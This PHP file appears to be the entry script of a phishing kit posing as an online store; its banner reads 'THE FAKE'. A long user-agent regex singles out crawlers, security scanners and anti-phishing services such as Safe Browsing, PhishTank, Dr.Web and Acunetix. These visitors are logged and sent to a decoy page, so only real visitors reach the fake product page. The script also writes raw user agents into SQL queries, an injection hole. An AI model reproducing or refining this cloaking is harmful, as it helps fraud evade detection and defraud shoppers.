<?php 

/*
▀▀█▀▀ █  █ █▀▀▀    █▀▀▀ █▀▀█ █ ▄▀ █▀▀▀ 
  █   █▀▀█ █▀▀▀ ▀▀ █▀▀▀ █▄▄█ █▀▄  █▀▀▀ 
  █   █  █ █▄▄▄    █    █  █ █  █ █▄▄▄
*/

require_once("api/db.php");

function T(){
		
			 if( preg_match('/BR-Safe-Browsing|abot|dbot|ebot|hbot|kbot|lbot|mbot|nbot|obot|pbot|rbot|sbot|tbot|vbot|ybot|zbot|bot|.bot|-bot|crawl|slurp|spider|seek|accoona|acoon|adressendeutschland|ah-ha.com|ahoy|altavista|ananzi|anthill|appie|arachnophilia|arale|araneo|aranha|architext|aretha|arks|asterias|atlocal|atn|atomz|augurfind|backrub|bannana_bot|baypup|bdfetch|big brother|biglotron|bjaaland|blackwidow|blaiz|blog|blo|bloodhound|boitho|booch|bradley|butterfly|calif|cassandra|ccubee|cfetch|charlotte|churl|cienciaficcion|cmc|collective|comagent|combine|computingsite|csci|curl|cusco|daumoa|deepindex|delorie|depspid|deweb|die blinde kuh|digger|ditto|dmoz|docomo|download express|dtaagent|dwcp|ebiness|ebingbong|e-collector|ejupiter|emacs-w3 search engine|esther|evliya celebi|ezresult|falcon|felix ide|ferret|fetchrover|fido|findlinks|fireball|fish search|fouineur|funnelweb|gazz|gcreep|genieknows|getterroboplus|geturl|glx|goforit|golem|grabber|grapnel|gralon|griffon|gromit|grub|gulliver|hamahakki|harvest|havindex|helix|heritrix|hku www octopus|homerweb|htdig|html index|html_analyzer|htmlgobble|hubater|hyper-decontextualizer|ia_archiver|ibm_planetwide|ichiro|iconsurf|iltrovatore|image.kapsi.net|imagelock|incywincy|indexer|infobee|informant|ingrid|inktomisearch.com|inspector web|intelliagent|internet shinchakubin|ip3000|iron33|israeli-search|ivia|jack|jakarta|javabee|jetbot|jumpstation|katipo|kdd-explorer|kilroy|knowledge|kototoi|kretrieve|labelgrabber|lachesis|larbin|legs|libwww|linkalarm|link validator|linkscan|lockon|lwp|lycos|magpie|mantraagent|mapoftheinternet|marvin|mattie|mediafox|mediapartners|mercator|merzscope|microsoft url control|minirank|miva|mj12|mnogosearch|moget|monster|moose|motor|multitext|muncher|muscatferret|mwd.search|myweb|najdi|nameprotect|nationaldirectory|nazilla|ncsa beta|nec-meshexplorer|nederland.zoek|netcarta webmap engine|netmechanic|netresearchserver|netscoop|newscan-online|nhse|nokia6682|nomad|noyona|nutch|nzexplorer|objectssearch|occam|omni|open text|openfind|openintelligencedata|orb search|osis-project|pack rat|pageboy|pagebull|page_verifier|panscient|parasite|partnersite|patric|pear.|pegasus|peregrinator|pgp key agent|phantom|phpdig|picosearch|piltdownman|pimptrain|pinpoint|pioneer|piranha|plumtreewebaccessor|pogodak|poirot|pompos|poppelsdorf|poppi|popular iconoclast|psycheclone|publisher|python|rambler|raven search|roach|road runner|roadhouse|robbie|robofox|robozilla|rules|salty|sbider|scooter|scoutjet|scrubby|search.|searchprocess|semanticdiscovery|senrigan|sg-scout|shark|shopwiki|sidewinder|sift|silk|simmany|site searcher|site valet|sitetech-rover|skymob.com|sleek|smartwit|sna-|snappy|snooper|sohu|speedfind|sphere|sphider|spinner|spyder|steeler|suke|suntek|supersnooper|surfnomore|sven|sygol|szukacz|tach black widow|tarantula|templeton|teoma|t-h-u-n-d-e-r-s-t-o-n-e|theophrastus|titan|titin|tkwww|toutatis|t-rex|tutorgig|twiceler|twisted|ucsd|udmsearch|url check|updated|vagabondo|valkyrie|verticrawl|victoria|vision-search|volcano|voyager|voyager-hc|w3c_validator|w3m2|w3mir|walker|wallpaper|wanderer|wauuu|wavefire|web core|web hopper|web wombat|webbandit|webcatcher|webcopy|webfoot|weblayers|weblinker|weblog monitor|webmirror|webmonkey|webquest|webreaper|websitepulse|websnarf|webstolperer|webvac|webwalk|webwatch|webwombat|webzinger|wget|whizbang|whowhere|wild ferret|worldlight|wwwc|wwwster|xenu|xget|xift|xirq|yandex|yanga|yeti|yodao|zao|zippp|zyborg|infinityfree|bol|uol|hotmail|gmail|Slurp|MSNBot|ia_archiver|Rambler|Yandex|azurevps|azure|amazonaws|scanurl|hostinger|Dr.Web|drweb|gazz|gcreep|genieknows|getterroboplus|geturl|glx|goforit|golem|grabber|grapnel|gralon|griffon|gromit|grub|gulliver|hamahakki|harvest|havindex|helix|heritrix|hku www octopus|homerweb|htdig|html index|html_analyzer|htmlgobble|hubater|hyper-decontextualizer|ia_archiver|ibm_planetwide|ichiro|iconsurf|iltrovatore|image.kapsi.net|imagelock|incywincy|indexer|infobee|informant|ingrid|inktomisearch.com|inspector web|intelliagent|internet shinchakubin|ip3000|iron33|israeli-search|ivia|jack|jakarta|javabee|jetbot|jumpstation|katipo|kdd-explorer|kilroy|knowledge|kototoi|kretrieve|labelgrabber|lachesis|larbin|legs|libwww|linkalarm|link validator|linkscan|lockon|lwp|lycos|magpie|mantraagent|mapoftheinternet|marvin|mattie|mediafox|mediapartners|mercator|merzscope|microsoft url control|minirank|miva|mj12|mnogosearch|moget|monster|moose|multitext|muncher|muscatferret|mwd.search|myweb|najdi|nameprotect|nationaldirectory|nazilla|ncsa beta|nec-meshexplorer|nederland.zoek|netcarta webmap engine|netmechanic|netresearchserver|netscoop|newscan-online|nhse|nokia6682|nomad|noyona|nutch|nzexplorer|objectssearch|occam|omni|open text|openfind|openintelligencedata|orb search|osis-project|pack rat|pageboy|pagebull|page_verifier|panscient|parasite|partnersite|patric|pear|pegasus|peregrinator|pgp key agent|phantom|phpdig|picosearch|piltdownman|pimptrain|pinpoint|pioneer|piranha|plumtreewebaccessor|pogodak|poirot|pompos|poppelsdorf|poppi|popular iconoclast|psycheclone|publisher|python|rambler|raven search|roach|road runner|roadhouse|robbie|robofox|robozilla|rules|salty|sbider|scooter|scoutjet|scrubby|search|searchprocess|semanticdiscovery|senrigan|sg-scout|shai hulud|shark|shopwiki|sidewinder|sift|silk|simmany|site searcher|site valet|sitetech-rover|skymob.com|sleek|smartwit|sna|snappy|snooper|sohu|speedfind|sphere|sphider|spinner|spyder|steeler|suke|suntek|supersnooper|surfnomore|sven|sygol|szukacz|tach black widow|tarantula|templeton|teoma|t-h-u-n-d-e-r-s-t-o-n-e|theophrastus|titan|titin|tkwww|toutatis|t-rex|tutorgig|twiceler|twisted|ucsd|udmsearch|url check|updated|vagabondo|valkyrie|verticrawl|victoria|vision-search|volcano|voyager|voyager-hc|w3c_validator|w3m2|w3mir|walker|wallpaper|wanderer|wauuu|wavefire|web core|web hopper|web wombat|webbandit|webcatcher|webcopy|webfoot|weblayers|weblinker|weblog monitor|webmirror|webmonkey|webquest|webreaper|websitepulse|websnarf|webstolperer|webvac|webwalk|webwatch|webwombat|webzinger|wget|whizbang|whowhere|wild ferret|worldlight|wwwc|die blinde kuh|digger|ditto|dmoz|docomo|download express|dtaagent|dwcp|ebiness|ebingbong|e-collector|ejupiter|emacs-w3 search engine|esther|evliya celebi|ezresult|falcon|felix ide|ferret|fetchrover|fido|findlinks|fireball|fish search|fouineur|funnelweb|arale|araneo|aranha|architext|aretha|arks|asterias|atlocal|atn|atomz|augurfind|backrub|bannana_bot|baypup|bdfetch|big brother|biglotron|bjaaland|blackwidow|blaiz|blog|blo|bloodhound|boitho|booch|bradley|butterfly|calif|cassandra|ccubee|cfetch|charlotte|churl|cienciaficcion|cmc|collective|comagent|combine|computingsite|csci|curl|cusco|daumoa|deepindex|delorie|depspid|deweb|safe|wwwster|xenu|xift|xirq|yandex|yanga|yeti|messenger|whatsapp|oculus|GoogleDocs|apps-spreadsheets|Carbon|blockedURIs|safebrowsing.blockedURIs|safebrowsing.download|remote.block.dangerous_host|dangerous_host|block_potentially|potentially|safebrowsing.malware|malware|safebrowsing.phishing|phishing|safebrowsing.provider|getSharingURL|reportPhishMistakeURL|gethashURL|yahoo|50.nu|a6-indexer|admantx|amznkassocbot|aboundexbot|aboutusbot|abrave spider|accelobot|acoonbot|addthis.com|adsbot-google|ahrefsbot|alexabot|amagit.com|analytics|antbot|apercite|aportworm|arabot|crawl|slurp|spider|seek|accoona|acoon|adressendeutschland|ah-ha.com|ahoy|altavista|ananzi|anthill|appie|arachnophilia|dreamhost|netpilot|calyxinstitute|tor-exit|safebrowsing|apache-httpclient|lssrocketcrawler|Trident|Macintosh|crawler|urlredirectresolver|jetbrains|spam|windows 95|windows 98|acunetix|netsparker|google|007ac9|008|192.comagent|200pleasebot|360spider|4seohuntbot|blockedURIs|safebrowsing.blockedURIs|safebrowsing.download|remote.block.dangerous_host|dangerous_host|block_potentially|potentially|safebrowsing.malware|malware|safebrowsing.phishing|phishing|safebrowsing.provider|getSharingURL|reportPhishMistakeURL|gethashURL|above|google|softlayer|amazonaws|cyveillance|compatible|phishtank|googlebot|safe|websafe|safebrowser|abuse|phishing|antiphishing|abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|AlexaBot|Alexabot|alexabot|Alexa|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|googleweblight|Storebot-Google|Google Favicon|DuplexWeb-Google|Google-Read-Aloud|FeedFetcher-Google|AdsBot-Google-Mobile-Apps|Mediapartners-Google|Googlebot-News|Googlebot-Image|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|Googlebot-Video|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i', $_SERVER["HTTP_USER_AGENT"])){
                return true;
             }else{
				return false;
			 }			
}

$I = T();

##==================================

function O(){
		$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");	$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
		$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android"); $palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
		$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry"); $ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
		$symbian = strpos($_SERVER['HTTP_USER_AGENT'],"Symbian"); $windowsphone = strpos($_SERVER['HTTP_USER_AGENT'],"Windows Phone");
    
		if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian || $windowsphone == true) {
		return "mobile";
		}else{
		return "desktop";
		}
}

if($I==true){

			$ip = $_SERVER['REMOTE_ADDR'];
            $useragent = $_SERVER['HTTP_USER_AGENT'];
            $query = mysqli_query($conn, "INSERT INTO bot (ip, useragent) VALUES ('$ip', '$useragent')");		 
			header("location: bot/index.html"); 
			exit();

}
else if($I==false){
	 
	 $dispositivo = O();
	 $ip = $_SERVER['REMOTE_ADDR'];
	 $useragent = $_SERVER['HTTP_USER_AGENT'];
 
     $query = mysqli_query($conn, "INSERT INTO $dispositivo (ip, useragent) VALUES ('$ip', '$useragent')"); 
 
	 if (!isset($_GET["id"])) {
	   
	   session_destroy();
	   header("Location: https://www.lojavirtual.com.br/");
	   exit();
	
	}
	else {
	  $index = time() + 1000;
	  $_SESSION['session_index'] = $index;
	  $thefake = md5(rand(9999,9999999)) . md5(time());
	  $tempo = time();
	  $id = addslashes($_GET["id"]);
	  header("Location: produto.php?$tempo=$thefake&produto=$id");
	}
	
}
else {}
?>